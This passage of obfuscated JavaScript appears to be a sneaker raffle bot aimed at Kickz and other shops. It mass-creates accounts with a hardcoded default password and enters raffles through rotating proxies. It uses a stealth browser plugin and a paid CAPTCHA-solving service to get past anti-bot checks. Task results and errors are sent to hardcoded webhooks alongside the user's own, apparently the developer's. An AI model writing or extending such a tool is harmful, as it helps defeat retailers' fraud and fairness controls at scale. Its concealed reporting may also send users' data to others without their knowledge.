            }), await _0x358c5e['goto'](_0x2a12f6, { 'waitUntil': 'networkidle2' }), console['log'](_0x31f3f5() + '\x20[' + _0x2418d7['name'] + ']\x20Task\x20' + (_0xbedb7e + 0x1) + '\x20:\x20Gathering\x20cookies'), await _0x358c5e['waitForTimeout'](0xfa0), console['log'](_0x31f3f5() + '\x20[' + _0x2418d7['name'] + ']\x20Task\x20' + (_0xbedb7e + 0x1) + '\x20:\x20Cookies\x20received'), await _0x358c5e['waitForTimeout'](0x320);
            if (_0x31ac67[_0xbedb7e]['Size'] == 'RANDOM') {
                console['log'](_0x31f3f5() + '\x20[' + _0x2418d7['name'] + ']\x20Task\x20' + (_0xbedb7e + 0x1) + '\x20:\x20Choosing\x20random\x20size');
                const _0xc44c04 = await _0x358c5e['$$eval']('div.size-picker.mt-2\x20>\x20ul\x20>\x20li\x20>\x20a', _0x14159b => {
                    return _0x14159b['map'](_0x49a0b8 => _0x49a0b8['href']);
                });
                var _0x948509 = Math['round'](Math['random']() * (_0xc44c04['length'] - 0x1));
                await _0x358c5e['goto']('' + _0xc44c04[_0x948509]);
            } else {
                console['log'](_0x31f3f5() + '\x20[' + _0x2418d7['name'] + ']\x20Task\x20' + (_0xbedb7e + 0x1) + '\x20:\x20Choosing\x20Size\x20' + _0x31ac67[_0xbedb7e]['Size']);
                try {
                    const _0x4a1ad0 = await _0x358c5e['$$eval']('li[data-original-title=\x22Größe\x20in\x20EU:\x20' + _0x31ac67[_0xbedb7e]['Size'] + '\x22]\x20>\x20a', _0x21506a => {
                        return _0x21506a['map'](_0x3cdd25 => _0x3cdd25['href']);
                    });
                    await _0x358c5e['goto']('' + _0x4a1ad0[0x0], { 'waitUntil': 'networkidle2' });
                } catch (_0x120a6c) {
                    console['log'](_0x471d3f['red'](_0x31f3f5() + '\x20[' + _0x2418d7['name'] + ']\x20Task\x20' + (_0xbedb7e + 0x1) + '\x20:\x20' + _0x120a6c + '\x20Size\x20not\x20found')), _0x61488e = 'Size\x20Not\x20Found';
                    var _0x2b40be = await _0x51c110(_0x31ac67[_0xbedb7e], _0x2418d7, 'dev', !![], _0x61488e);
                    _0x95da97['errorDEV'] = { 'embeds': [_0x2b40be] };
                    _0x1ca3b9['webhook'] != undefined && _0x1ca3b9['webhook'] != '' && await _0x5778ae(_0x1ca3b9['webhook'], _0x95da97['errorDEV']);
                    await _0x5778ae(_0xc30fae, _0x95da97['errorDEV']);
                    continue;
                }
            }
            await _0x358c5e['waitForTimeout'](0x258), await _0x358c5e['type']('#raffle-instagram', '' + _0x31ac67[_0xbedb7e]['Follower'], { 'delay': 0x64 }), await _0x358c5e['waitForTimeout'](0x384), await _0x358c5e['click']('#raffle-terms'), await _0x358c5e['waitForTimeout'](0x384), await _0x358c5e['evaluate'](() => {
                const _0x38674b = document['querySelector']('button.btn[name=\x27add\x27]');
                _0x38674b['click']();
            }), await _0x358c5e['waitForTimeout'](0xbb8), await _0x358c5e['waitForSelector']('#checkout_email'), await _0x30926a(0x3e8), console['log'](_0x31f3f5() + '\x20[' + _0x2418d7['name'] + ']\x20Task\x20' + (_0xbedb7e + 0x1) + '\x20:\x20Filling\x20Information');
            _0x3c2425 == 'sec' ? await _0x358c5e['type']('#checkout_email', '' + _0x31ac67[_0xbedb7e]['FirstName'] + _0x31ac67[_0xbedb7e]['LastName'] + _0x1ca3b9['catchall'], 0x32) : await _0x358c5e['type']('#checkout_email', '' + _0x31ac67[_0xbedb7e]['Email'], 0x32);
            await _0x30926a(0x320), await _0x358c5e['select']('#checkout_shipping_address_country', '' + _0x31ac67[_0xbedb7e]['Country']), await _0x358c5e['waitForTimeout'](0x258), await _0x358c5e['type']('#checkout_shipping_address_first_name', '' + _0x31ac67[_0xbedb7e]['FirstName']), await _0x358c5e['waitForTimeout'](0x320), await _0x358c5e['type']('#checkout_shipping_address_last_name', '' + _0x31ac67[_0xbedb7e]['LastName']), await _0x358c5e['waitForTimeout'](0x2bc), await _0x358c5e['type']('#checkout_shipping_address_address1', _0x31ac67[_0xbedb7e]['Address1'] + '\x20' + _0x31ac67[_0xbedb7e]['HouseNumber']), await _0x358c5e['waitForTimeout'](0x2bc), await _0x358c5e['type']('#checkout_shipping_address_address2', '' + _0x31ac67[_0xbedb7e]['Address2']), await _0x358c5e['waitForTimeout'](0x2bc);
            _0x31ac67[_0xbedb7e]['Postcode'] == undefined ? await _0x358c5e['type']('#checkout_shipping_address_zip', '' + _0x31ac67[_0xbedb7e]['Zip']) : await _0x358c5e['type']('#checkout_shipping_address_zip', '' + _0x31ac67[_0xbedb7e]['Postcode']);
            await _0x358c5e['waitForTimeout'](0x2bc), await _0x358c5e['type']('#checkout_shipping_address_city', '' + _0x31ac67[_0xbedb7e]['City']), await _0x358c5e['waitForTimeout'](0x2bc), console['log'](_0x31f3f5() + '\x20[' + _0x2418d7['name'] + ']\x20Task\x20' + (_0xbedb7e + 0x1) + '\x20:\x20Getting\x20Shipping'), await _0x358c5e, _0x358c5e['evaluate'](() => {
                const _0x29a33b = document['querySelector']('#continue_button');
                for (var _0x5bba4b = 0x0; _0x5bba4b < 0x5; _0x5bba4b++) {
                    if (_0x29a33b) {
                        _0x29a33b['click'](), _0x29a33b['click']();
                        break;
                    } else
                        _0x30926a(0xfa0);
                }
            }), await _0x358c5e['waitForTimeout'](0x1194);
            try {
                await _0x358c5e['waitForSelector']('div.radio-wrapper', { 'timeout': 0x186a0 });
            } catch {
                console['log'](_0x471d3f['red'](_0x31f3f5() + '\x20[' + _0x2418d7['name'] + ']\x20Task\x20' + (_0xbedb7e + 0x1) + '\x20:\x20Proxy\x20Error'));
                continue;
            }
            _0x358c5e['evaluate'](() => {
                const _0x10de02 = document['querySelector']('#continue_button');
                for (var _0xd416a3 = 0x0; _0xd416a3 < 0x5; _0xd416a3++) {
                    if (_0x10de02) {
                        _0x10de02['click']();
                        break;
                    } else
                        _0x30926a(0xfa0);
                }
            }), await _0x358c5e['waitForTimeout'](0x7d0), console['log'](_0x31f3f5() + '\x20[' + _0x2418d7['name'] + ']\x20Task\x20' + (_0xbedb7e + 0x1) + '\x20:\x20Finishing\x20Entry'), await _0x358c5e['waitForSelector']('#continue_button', { 'timeout': 0x186a0 }), _0x358c5e['evaluate'](() => {
                const _0x5e57dd = document['querySelector']('#continue_button');
                for (var _0xb8a6de = 0x0; _0xb8a6de < 0x5; _0xb8a6de++) {
                    if (_0x5e57dd) {
                        _0x5e57dd['click']();
                        break;
                    } else
                        _0x30926a(0xfa0);
                }
            }), await _0x358c5e['waitForTimeout'](0x1194), await _0x358c5e['waitForSelector']('#continue_button'), _0x358c5e['evaluate'](() => {
                const _0x21f400 = document['querySelector']('#continue_button');
                for (var _0x2466bc = 0x0; _0x2466bc < 0x5; _0x2466bc++) {
                    if (_0x21f400) {
                        _0x21f400['click']();
                        break;
                    } else
                        _0x30926a(0xfa0);
                }
            });
            try {
                await _0x358c5e['waitForSelector']('div[data-step=\x22thank_you\x22]'), _0x469ee8 = 'no', _0x2989d8(_0x31ac67[_0xbedb7e], _0x2418d7), console['log'](_0x471d3f['green'](_0x31f3f5() + '\x20[' + _0x2418d7['name'] + ']\x20Task\x20' + (_0xbedb7e + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                if (_0x1ca3b9['webhook'] != undefined && _0x1ca3b9['webhook'] != '')
                    try {
                        await _0x5778ae(_0x1ca3b9['webhook'], _0x95da97['succesDEVMSG']);
                    } catch {
                    }
                await _0x30926a(0xc8), await _0x5778ae(_0x580ee6, _0x95da97['succesDEVMSG']), await _0x30926a(0xc8);
                try {
                    await _0x5778ae(_0xb27635, _0x95da97['succesPUBMSG']);
                } catch {
                }
            } catch (_0x3e53b2) {
                console['log'](_0x471d3f['red'](_0x31f3f5() + '\x20[' + _0x2418d7['name'] + ']\x20Task\x20' + (_0xbedb7e + 0x1) + '\x20:\x20Entry\x20Failed:\x20' + _0x3e53b2));
            }
        } catch (_0x1697e7) {
            console['log'](_0x471d3f['red'](_0x31f3f5() + '\x20[' + _0x2418d7['name'] + ']\x20Task\x20' + (_0xbedb7e + 0x1) + '\x20:\x20' + _0x1697e7)), _0x61488e = '' + _0x1697e7;
            var _0x2b40be = await _0x51c110(_0x31ac67[_0xbedb7e], _0x2418d7, 'dev', !![], _0x61488e);
            _0x95da97['errorDEV'] = { 'embeds': [_0x2b40be] }, _0x1ca3b9['webhook'] != undefined && _0x1ca3b9['webhook'] != '' && await _0x5778ae(_0x1ca3b9['webhook'], _0x95da97['errorDEV']), await _0x5778ae(_0xc30fae, _0x95da97['errorDEV']), _0x469ee8 = 'yes';
        } finally {
            _0x21fb1b && _0x21fb1b['close']();
            if (_0x469ee8 == 'yes' && _0x3b2db9 != 0x5 && _0x61488e != 'Size\x20Not\x20Found') {
                console['log'](_0x471d3f['red'](_0x31f3f5() + '\x20[' + _0x2418d7['name'] + ']\x20Task\x20' + (_0xbedb7e + 0x1) + '\x20:\x20Retrying')), _0xbedb7e = _0xbedb7e - 0x1, _0x3b2db9 = _0x3b2db9 + 0x1;
                continue;
            }
            _0x469ee8 == 'yes' && _0x3b2db9 >= 0x5 && (_0x3c82b6(_0x31ac67[_0xbedb7e], _0x2418d7), _0x469ee8 = 'no', _0x3b2db9 = 0x0);
            if (_0xbedb7e + 0x1 == _0x31ac67['length']) {
                console['log'](_0x471d3f['green']('Finished\x20tasks,\x20returning\x20to\x20Main\x20Menu')), await _0x30926a(0x7d0);
                break;
            }
            console['log']('Waiting\x20for\x20' + _0x1ca3b9['AfewDelay'] + '\x20ms'), await _0x30926a(_0x1ca3b9['AfewDelay']);
        }
    }
};
async function _0x4b799c(_0x159b41, _0x389318, _0x58468b, _0x33edba) {
    _0x53a2e2['use'](_0x572d68()), _0x53a2e2['use'](_0x38f41a({
        'provider': {
            'id': '2captcha',
            'token': '' + _0x1ca3b9['captchaKey']
        },
        'visualFeedback': !![]
    }));
    for (var _0x3f17ac = 0x0; _0x3f17ac < _0x58468b['length']; _0x3f17ac++) {
        if (_0x7a594f != 'yes')
            var _0x7a594f = '', _0x1443de = 0x0;
        _0x359416(_0x389318['name'] + '\x20Task\x20' + (_0x3f17ac + 0x1) + '\x20/\x20' + _0x58468b['length'] + '\x20||\x20File:\x20' + _0x25c22b + '\x20Proxies:\x20' + _0x2e4847), await _0x44956d(_0x58468b, _0x3f17ac);
        var _0x5bc1f6 = [{
            'type': 'rich',
            'title': 'Succesful\x20Kickz\x20Account\x20Generated',
            'description': '',
            'color': 0xc0d6d6,
            'fields': [
                {
                    'name': 'User',
                    'value': '' + _0x3566aa
                },
                {
                    'name': 'Delay',
                    'value': '' + _0x1ca3b9['delay']
                },
                {
                    'name': 'Version',
                    'value': '' + _0x531a7c
                }
            ]
        }];
        const _0xcd6304 = { 'embeds': _0x5bc1f6 };
        var _0x445db4 = await _0x51c110(_0x58468b[_0x3f17ac], _0x389318, 'acc', ![]);
        const _0x55fe3c = { 'succesDEVMSG': { 'embeds': [_0x445db4] } };
        if (_0x58468b[_0x3f17ac]['Email'] == '' || _0x58468b[_0x3f17ac]['FirstName'] == '' || _0x58468b[_0x3f17ac]['LastName'] == '') {
            console['log'](_0x31f3f5() + '\x20[' + _0x389318['name'] + ']\x20Task\x20' + (_0x3f17ac + 0x1) + '\x20:\x20Invalid\x20CSV');
            continue;
        }
        _0x58468b[_0x3f17ac]['Password'] == '' && (_0x58468b[_0x3f17ac]['Password'] = 'JRaffles23!');
        if (_0x1ca3b9['useRandomProxy'] = ![])
            var _0x430b4b = _0x33edba[_0x3f17ac]['split'](':');
        else
            var _0x5b66dd = Math['round'](Math['random']() * (_0x33edba['length'] - 0x1)), _0x430b4b = _0x33edba[_0x5b66dd]['split'](':');
        const _0x1d975f = await _0x53a2e2['launch']({
            'headless': !![],
            'args': [
                '--proxy-server=' + _0x430b4b[0x0] + ':' + _0x430b4b[0x1],
                '--no-sandbox',
                '--disable-setuid-sandbox'
            ]
        });
        try {
            const _0x2cf633 = await _0x1d975f['newPage']();
            await _0x2cf633['authenticate']({
                'username': '' + _0x430b4b[0x2],
                'password': '' + _0x430b4b[0x3]
            }), console['log'](_0x31f3f5() + '\x20[' + _0x389318['name'] + ']\x20Task\x20' + (_0x3f17ac + 0x1) + '\x20:\x20Getting\x20Session'), await _0x2cf633['setRequestInterception'](!![]), _0x2cf633['on']('request', _0x5d84e9 => {
                _0x5d84e9['resourceType']() === 'image' || _0x5d84e9['resourceType']() === 'font' || _0x5d84e9['resourceType']() === 'media' ? _0x5d84e9['abort']() : _0x5d84e9['continue']();
            }), await _0x2cf633['goto'](_0x159b41), await _0x30926a(0xbb8), console['log'](_0x31f3f5() + '\x20[' + _0x389318['name'] + ']\x20Task\x20' + (_0x3f17ac + 0x1) + '\x20:\x20Starting\x20Registration'), await _0x2cf633['waitForSelector']('#consent-dialog\x20>\x20section\x20>\x20button'), await _0x2cf633['click']('#consent-dialog\x20>\x20section\x20>\x20button'), await _0x2cf633['waitForSelector']('#button-register'), await _0x30926a(0x7d0), await _0x2cf633['evaluate'](() => {
                const _0x5e40a5 = document['querySelector']('#button-register');
                _0x5e40a5['click']();
            }), console['log'](_0x31f3f5() + '\x20[' + _0x389318['name'] + ']\x20Task\x20' + (_0x3f17ac + 0x1) + '\x20:\x20Setting\x20Credentials'), await _0x30926a(0x1388), await _0x2cf633['waitForSelector']('#customer_salutation'), await _0x2cf633['select']('#customer_salutation', 'mr'), await _0x30926a(0x7d0), await _0x2cf633['waitForSelector']('#customer_firstname'), await _0x2cf633['type']('#customer_firstname', '' + _0x58468b[_0x3f17ac]['FirstName']), await _0x30926a(0x352), await _0x2cf633['waitForSelector']('#customer_lastname'), await _0x2cf633['type']('#customer_lastname', '' + _0x58468b[_0x3f17ac]['LastName']), await _0x30926a(0x352), await _0x2cf633['type']('#email-input', '' + _0x58468b[_0x3f17ac]['Email']), await _0x30926a(0x352), await _0x2cf633['type']('#email-confirm-input', '' + _0x58468b[_0x3f17ac]['Email']), await _0x30926a(0x352), await _0x2cf633['type']('#register-password', '' + _0x58468b[_0x3f17ac]['Password']), await _0x30926a(0x352), await _0x2cf633['type']('#password-confirm', '' + _0x58468b[_0x3f17ac]['Password']), await _0x30926a(0x352), console['log'](_0x31f3f5() + '\x20[' + _0x389318['name'] + ']\x20Task\x20' + (_0x3f17ac + 0x1) + '\x20:\x20Sending\x20Credentials'), await _0x2cf633['click']('#consent'), await _0x30926a(0x1f4);
            const _0x80145e = await _0x2cf633['$']('div.inputErrorMsg.b-form_section-message');
            if (_0x80145e) {
                console['log'](_0x471d3f['red'](_0x31f3f5() + '\x20[' + _0x389318['name'] + ']\x20Task\x20' + (_0x3f17ac + 0x1) + '\x20:\x20Your\x20password\x20must\x20contain\x20at\x20least\x20one\x20uppercase\x20&\x20one\x20lowercase\x20letter,\x20one\x20number\x20and\x20one\x20special\x20character.'));
                continue;
            }
            await _0x2cf633['click']('#buttonRegister');
            try {
                await _0x2cf633['waitForSelector']('#verificationCode');
            } catch {
                throw new Error('Account\x20already\x20registered');
            }
            console['log'](_0x471d3f['yellow'](_0x31f3f5() + '\x20[' + _0x389318['name'] + ']\x20Task\x20' + (_0x3f17ac + 0x1) + '\x20:\x20Account\x20' + _0x58468b[_0x3f17ac]['Email'] + '\x20Generated!')), console['log'](_0x471d3f['yellow'](_0x31f3f5() + '\x20[' + _0x389318['name'] + ']\x20Task\x20' + (_0x3f17ac + 0x1) + '\x20:\x20A\x20verification\x20code\x20has\x20been\x20sent\x20to\x20' + _0x58468b[_0x3f17ac]['Email'])), await _0x30926a(0x4b0);
            async function _0x23dca6() {
                console['log'](_0x471d3f['yellow'](_0x31f3f5() + '\x20[' + _0x389318['name'] + ']\x20Task\x20' + (_0x3f17ac + 0x1) + '\x20:\x20Paste\x20your\x20verification\x20code\x20here:'));
                var _0x52833e = await _0x439958['get']('Code');
                return _0x52833e['Code'];
            }
            ;
            code = await _0x23dca6(), _0x30926a(0x320), console['log'](_0x31f3f5() + '\x20[' + _0x389318['name'] + ']\x20Task\x20' + (_0x3f17ac + 0x1) + '\x20:\x20Verifying..'), await _0x2cf633['type']('#verificationCode', code), await _0x30926a(0x1f4), await _0x2cf633['click']('#buttonVerify'), await _0x30926a(0x190), await _0x2cf633['click']('#buttonVerify'), await _0x30926a(0x3e8);
            try {
                await _0x2cf633['waitForSelector']('div.b-user_greeting'), _0x7a594f = 'no', console['log'](_0x471d3f['green'](_0x31f3f5() + '\x20[' + _0x389318['name'] + ']\x20Task\x20' + (_0x3f17ac + 0x1) + '\x20:\x20Account\x20' + _0x58468b[_0x3f17ac]['Email'] + '\x20Generated\x20&\x20Verified!')), _0x1c44db['appendFileSync']('../accounts/kickz-verified.csv', '\x0a' + _0x58468b[_0x3f17ac]['Email'] + ',' + _0x58468b[_0x3f17ac]['Password'] + ','), console['log'](_0x31f3f5() + '\x20[' + _0x389318['name'] + ']\x20Task\x20' + (_0x3f17ac + 0x1) + '\x20:\x20Account\x20' + _0x58468b[_0x3f17ac]['Email'] + '\x20Saved\x20in\x20\x27accounts/kickz-verified.csv\x27');
                try {
                    _0x1ca3b9['webhook'] != undefined && _0x1ca3b9['webhook'] != '' && await _0x5778ae(_0x1ca3b9['webhook'], _0x55fe3c['succesDEVMSG']);
                } catch {
                }
                await _0x5778ae(_0x5cef85, _0x55fe3c['succesDEVMSG']);
            } catch {
                _0x7a594f = 'no', console['log'](_0x471d3f['red'](_0x31f3f5() + '\x20[' + _0x389318['name'] + ']\x20Task\x20' + (_0x3f17ac + 0x1) + '\x20:\x20Verification\x20failed')), console['log'](_0x471d3f['red'](_0x31f3f5() + '\x20[' + _0x389318['name'] + ']\x20Task\x20' + (_0x3f17ac + 0x1) + '\x20:\x20Account\x20saved\x20in\x20\x27accounts/kickz-unverified.csv\x27'));
            }
        } catch (_0x99d17c) {
            console['log'](_0x471d3f['red'](_0x31f3f5() + '\x20[' + _0x389318['name'] + ']\x20Task\x20' + (_0x3f17ac + 0x1) + '\x20:\x20' + _0x99d17c)), _0x5bc1f6[0x0]['title'] = 'Failed\x20kickz\x20Acc\x20Gen', _0x5bc1f6[0x0]['description'] = '' + _0x99d17c, await _0x5778ae(_0xc30fae, _0xcd6304), _0x7a594f = 'yes';
        } finally {
            _0x1d975f && _0x1d975f['close']();
            if (_0x7a594f == 'yes' && _0x1443de != 0x5) {
                console['log'](_0x471d3f['red'](_0x31f3f5() + '\x20[' + _0x389318['name'] + ']\x20Task\x20' + (_0x3f17ac + 0x1) + '\x20:\x20Retrying')), _0x3f17ac = _0x3f17ac - 0x1, _0x1443de = _0x1443de + 0x1;
                continue;
            }
            _0x7a594f == 'yes' && _0x1443de >= 0x5 && (_0x3c82b6(_0x58468b[_0x3f17ac], _0x389318), _0x7a594f = 'no', _0x1443de = 0x0), console['log']('Waiting\x20for\x20' + _0x1ca3b9['delay'] + '\x20ms'), await _0x30926a(_0x1ca3b9['delay']);
        }
    }
}
async function _0x5d4098(_0x57711b, _0x2abd6d, _0x4a5d89) {
    _0x53a2e2['use'](_0x572d68()), _0x53a2e2['use'](_0x38f41a({
        'provider': {
            'id': '2captcha',
            'token': '' + _0x1ca3b9['captchaKey']
        },
        'visualFeedback': !![]
    }));
    for (var _0x1c8c93 = 0x0; _0x1c8c93 < _0x2abd6d['length']; _0x1c8c93++) {
        var _0x3d1b86;
        if (_0x2f4131 != 'yes')
            var _0x2f4131 = '', _0x58a5c0 = 0x0;
        _0x359416(_0x57711b['name'] + '\x20Task\x20' + (_0x1c8c93 + 0x1) + '\x20/\x20' + _0x2abd6d['length'] + '\x20||\x20File:\x20' + _0x25c22b + '\x20Proxies:\x20' + _0x2e4847);
        var _0x4200bb = [{
            'type': 'rich',
            'title': 'Succesful\x20Kickz\x20Entry',
            'description': '',
            'color': 0xc0d6d6,
            'fields': [
                {
                    'name': 'User',
                    'value': '' + _0x3566aa
                },
                {
                    'name': 'Product',
                    'value': '' + _0x2abd6d[_0x1c8c93]['Url']
                },
                {
                    'name': 'Size',
                    'value': '' + _0x2abd6d[_0x1c8c93]['Size']
                },
                {
                    'name': 'Delay',
                    'value': '' + _0x1ca3b9['delay']
                },
                {
                    'name': 'Version',
                    'value': '' + _0x531a7c
                }
            ]
        }], _0x2632c8 = await _0x51c110(_0x2abd6d[_0x1c8c93], _0x57711b, 'dev', ![]), _0x37de84 = await _0x51c110(_0x2abd6d[_0x1c8c93], _0x57711b, 'pub', ![]);
        const _0x27d65a = {
            'succesDEVMSG': { 'embeds': [_0x2632c8] },
            'succesPUBMSG': { 'embeds': [_0x37de84] }
        };
        await _0x44956d(_0x2abd6d, _0x1c8c93);
        if (_0x2abd6d[_0x1c8c93]['Email'] == '' || _0x2abd6d[_0x1c8c93]['Password'] == '' || _0x2abd6d[_0x1c8c93]['FirstName'] == '' || _0x2abd6d[_0x1c8c93]['LastName'] == '') {
            console['log'](_0x31f3f5() + '\x20[' + _0x57711b['name'] + ']\x20Task\x20' + (_0x1c8c93 + 0x1) + '\x20:\x20Invalid\x20CSV');
            continue;
        }
        if (_0x1ca3b9['useRandomProxy'] = ![])
            var _0xa3b264 = _0x4a5d89[_0x1c8c93]['split'](':');
        else
            var _0x3cdbee = Math['round'](Math['random']() * (_0x4a5d89['length'] - 0x1)), _0xa3b264 = _0x4a5d89[_0x3cdbee]['split'](':');
        const _0x21f0d4 = await _0x53a2e2['launch']({
            'headless': ![],
            'args': [
                '--proxy-server=' + _0xa3b264[0x0] + ':' + _0xa3b264[0x1],
                '--no-sandbox',
                '--disable-setuid-sandbox'
            ]
        });
        try {
            const _0x236d54 = await _0x21f0d4['newPage']();
            await _0x236d54['authenticate']({
                'username': '' + _0xa3b264[0x2],
                'password': '' + _0xa3b264[0x3]
            }), console['log'](_0x31f3f5() + '\x20[' + _0x57711b['name'] + ']\x20Task\x20' + (_0x1c8c93 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x236d54['setRequestInterception'](!![]), _0x236d54['on']('request', _0x49793f => {
                _0x49793f['resourceType']() === 'image' || _0x49793f['resourceType']() === 'font' || _0x49793f['resourceType']() === 'media' ? _0x49793f['abort']() : _0x49793f['continue']();
            }), await _0x236d54['goto']('' + _0x2abd6d[_0x1c8c93]['Url'], { 'waitUntil': 'networkidle2' }), await _0x30926a(0x12c);
            try {
                await _0x236d54['click']('a[title=\x22Sign\x20In\x22]');
            } catch {
                await _0x236d54['click']('a[title=\x22sign\x20in\x22]');
            }
            console['log'](_0x31f3f5() + '\x20[' + _0x57711b['name'] + ']\x20Task\x20' + (_0x1c8c93 + 0x1) + '\x20:\x20Logging\x20in'), await _0x236d54['waitForSelector']('#consent-dialog\x20>\x20section\x20>\x20button'), await _0x236d54['click']('#consent-dialog\x20>\x20section\x20>\x20button'), await _0x236d54['waitForSelector']('#username'), await _0x236d54['type']('#username', _0x2abd6d[_0x1c8c93]['Email']), await _0x236d54['waitForSelector']('#password'), await _0x236d54['type']('#password', _0x2abd6d[_0x1c8c93]['Password']), await _0x30926a(0x190), await _0x236d54['click']('#buttonSubmit'), await _0x236d54['waitForSelector']('div.b-user_greeting'), console['log'](_0x31f3f5() + '\x20[' + _0x57711b['name'] + ']\x20Task\x20' + (_0x1c8c93 + 0x1) + '\x20:\x20Getting\x20Product'), await _0x30926a(0x1f4), await _0x236d54['goto']('' + _0x2abd6d[_0x1c8c93]['Url'], { 'waitUntil': 'networkidle2' }), console['log'](_0x31f3f5() + '\x20[' + _0x57711b['name'] + ']\x20Task\x20' + (_0x1c8c93 + 0x1) + '\x20:\x20Choosing\x20size\x20' + _0x2abd6d[_0x1c8c93]['Size']);
            let _0x4e6059 = _0x2abd6d[_0x1c8c93]['Size']['replace']('.5', '\x201/2');
            await _0x236d54['click']('button[title=\x22' + _0x4e6059 + '\x22]'), await _0x30926a(0x1f4);
            try {
                await _0x236d54['click']('button[data-tau=\x22add_new_address\x22]');
            } catch {
            }
            await _0x30926a(0x12c), console['log'](_0x31f3f5() + '\x20[' + _0x57711b['name'] + ']\x20Task\x20' + (_0x1c8c93 + 0x1) + '\x20:\x20Filling\x20Information'), await _0x236d54['select']('#dwfrm_raffle_addressFields_salutation', 'mr'), await _0x30926a(0x12c), await _0x236d54['type']('#dwfrm_raffle_addressFields_firstName', _0x2abd6d[_0x1c8c93]['FirstName']), await _0x30926a(0x12c), await _0x236d54['type']('#dwfrm_raffle_addressFields_lastName', _0x2abd6d[_0x1c8c93]['LastName']), await _0x30926a(0x12c), await _0x236d54['select']('#dwfrm_raffle_addressFields_country', _0x2abd6d[_0x1c8c93]['Country']), await _0x30926a(0x12c), await _0x236d54['type']('#dwfrm_raffle_addressFields_city', _0x2abd6d[_0x1c8c93]['City']), await _0x30926a(0x12c);
            _0x2abd6d[_0x1c8c93]['Postcode'] == undefined && (_0x2abd6d[_0x1c8c93]['Postcode'] = _0x2abd6d[_0x1c8c93]['Zip']);
            await _0x236d54['type']('#dwfrm_raffle_addressFields_postalCode', _0x2abd6d[_0x1c8c93]['Postcode']), await _0x30926a(0x12c), await _0x236d54['type']('#dwfrm_raffle_addressFields_address1', _0x2abd6d[_0x1c8c93]['Address1']), await _0x30926a(0x12c), await _0x236d54['type']('#dwfrm_raffle_addressFields_address2', _0x2abd6d[_0x1c8c93]['HouseNumber']), await _0x30926a(0x12c), await _0x236d54['type']('#dwfrm_raffle_addressFields_additionalAddressInfo', _0x2abd6d[_0x1c8c93]['Address2']), await _0x30926a(0x12c), await _0x236d54['click']('#dwfrm_raffle_addressFields_saveAddress'), await _0x30926a(0x12c), await _0x236d54['type']('#dwfrm_raffle_raffleSpecificFields_instagramAccount', _0x2abd6d[_0x1c8c93]['Follower']), await _0x30926a(0x1f4), await _0x236d54['click']('#dwfrm_raffle_raffleSpecificFields_consentOnConditions'), await _0x30926a(0x1f4), console['log'](_0x31f3f5() + '\x20[' + _0x57711b['name'] + ']\x20Task\x20' + (_0x1c8c93 + 0x1) + '\x20:\x20' + _0x471d3f['blue']('Awaiting\x20Paypal\x20Payment')), await _0x236d54['click']('.b-paypal_button');
            try {
                await _0x236d54['waitForSelector']('.b-raffle-message.m-success', { 'timeout': 0x493e0 }), _0x2f4131 = 'no', _0x2989d8(_0x2abd6d[_0x1c8c93], _0x57711b), console['log'](_0x471d3f['green'](_0x31f3f5() + '\x20[' + _0x57711b['name'] + ']\x20Task\x20' + (_0x1c8c93 + 0x1) + '\x20:\x20Raffle\x20Entered!')), _0x1ca3b9['webhook'] != undefined && _0x1ca3b9['webhook'] != '' && await _0x5778ae(_0x1ca3b9['webhook'], _0x27d65a['succesDEVMSG']), await _0x30926a(0xc8), await _0x5778ae(_0x580ee6, _0x27d65a['succesDEVMSG']), await _0x30926a(0xc8), await _0x5778ae(_0xb27635, _0x27d65a['succesPUBMSG']);
            } catch (_0x313729) {
                console['log'](_0x471d3f['red'](_0x31f3f5() + '\x20[' + _0x57711b['name'] + ']\x20Task\x20' + (_0x1c8c93 + 0x1) + '\x20:\x20Paypal\x20Error:\x20' + _0x313729)), _0x3d1b86 = 'Error\x20while\x20entering\x20Paypal:\x20' + _0x313729;
                var _0x1b3d5e = await _0x51c110(_0x2abd6d[_0x1c8c93], _0x57711b, 'dev', !![], _0x3d1b86);
                _0x27d65a['errorDEV'] = { 'embeds': [_0x1b3d5e] }, _0x1ca3b9['webhook'] != undefined && _0x1ca3b9['webhook'] != '' && await _0x5778ae(_0x1ca3b9['webhook'], _0x27d65a['errorDEV']), await _0x5778ae(_0xc30fae, _0x27d65a['errorDEV']);
            }
        } catch (_0x2cd738) {
            console['log'](_0x471d3f['red'](_0x31f3f5() + '\x20[' + _0x57711b['name'] + ']\x20Task\x20' + (_0x1c8c93 + 0x1) + '\x20:\x20' + _0x2cd738)), _0x3d1b86 = '' + _0x2cd738;
            var _0x1b3d5e = await _0x51c110(_0x2abd6d[_0x1c8c93], _0x57711b, 'dev', !![], _0x3d1b86);
            _0x27d65a['errorDEV'] = { 'embeds': [_0x1b3d5e] }, _0x1ca3b9['webhook'] != undefined && _0x1ca3b9['webhook'] != '' && await _0x5778ae(_0x1ca3b9['webhook'], _0x27d65a['errorDEV']), await _0x5778ae(_0xc30fae, _0x27d65a['errorDEV']), _0x2f4131 = 'yes';
        } finally {
            _0x21f0d4 && _0x21f0d4['close']();
            if (_0x2f4131 == 'yes' && _0x58a5c0 != 0x5) {
                console['log'](_0x471d3f['red'](_0x31f3f5() + '\x20[' + _0x57711b['name'] + ']\x20Task\x20' + (_0x1c8c93 + 0x1) + '\x20:\x20Retrying')), _0x1c8c93 = _0x1c8c93 - 0x1, _0x58a5c0 = _0x58a5c0 + 0x1;
                continue;
            }
            _0x2f4131 == 'yes' && _0x58a5c0 >= 0x5 && (_0x3c82b6(_0x2abd6d[_0x1c8c93], _0x57711b), _0x2f4131 = 'no', _0x58a5c0 = 0x0), console['log']('Waiting\x20for\x20' + _0x1ca3b9['AfewDelay'] + '\x20ms'), await _0x30926a(_0x1ca3b9['AfewDelay']);
        }
    }
}
async function _0x4e3767(_0x738207, _0x2e4806) {
    _0x53a2e2['use'](_0x572d68()), _0x53a2e2['use'](_0x38f41a({
        'provider': {
            'id': '2captcha',
            'token': '' + _0x1ca3b9['captchaKey']
        },
        'visualFeedback': !![]
    }));
    for (var _0x1b9328 = 0x0; _0x1b9328 < bouncewear['length']; _0x1b9328++) {
        await _0x44956d(bouncewear, _0x1b9328);
        if (bouncewear[_0x1b9328]['Email'] == '' || bouncewear[_0x1b9328]['Password'] == '' || bouncewear[_0x1b9328]['FirstName'] == '' || bouncewear[_0x1b9328]['LastName'] == '') {
            console['log'](_0x31f3f5() + '\x20[' + _0x1299c5[taskModule]['name'] + ']\x20Task\x20' + (_0x1b9328 + 0x1) + '\x20:\x20Invalid\x20CSV');
